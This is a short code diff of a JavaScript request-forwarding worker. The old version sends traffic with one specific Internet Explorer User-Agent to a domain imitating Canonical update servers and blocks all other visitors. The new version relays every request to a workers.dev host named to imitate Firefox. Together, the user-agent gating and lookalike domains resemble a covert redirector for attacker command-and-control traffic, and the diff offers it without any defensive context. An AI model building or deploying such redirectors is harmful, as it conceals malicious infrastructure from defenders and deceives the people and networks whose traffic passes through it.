@@ -11,30 +11,15 @@
     addEventListener('fetch', event => {
       event.respondWith((async () => {
         // Define the target domain to redirect
-        const targetDomain = 'jammycanonicalupdates.cloud';
+        const targetDomain = 'http://firefox-com.foxiproxi.workers.dev';
         const request = event.request;
 
-        // Check if the User-Agent matches a specific string
-        if (request.headers.get('User-Agent') === 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko') {
-          // Create a new URL object with the request URL
-          const redirectURL = new URL(request.url);
-          // Change the hostname of the redirectURL to the target domain
-          redirectURL.hostname = targetDomain;
-          // Create a new Request object with the modified URL
-          const modifiedRequest = new Request(redirectURL, request);
-          // Fetch the redirected URL with the modified request
-          return fetch(modifiedRequest);
-        } else {
-          // If the User-Agent doesn't match, return a response with access denied message
-          const response = new Response('<h1>Access Denied</h1><p>You are not authorized to access this resource.</p>', {
-            status: 403,
-            statusText: 'Forbidden',
-            headers: {
-              'Content-Type': 'text/html'
-            }
-          });
-          return response;
-        }
+        // Create a new URL object with the target domain
+        const redirectURL = new URL(targetDomain);
+        // Create a new Request object with the target URL
+        const modifiedRequest = new Request(redirectURL, request);
+        // Fetch the redirected URL with the modified request
+        return fetch(modifiedRequest);
       })());
     });
   </script>
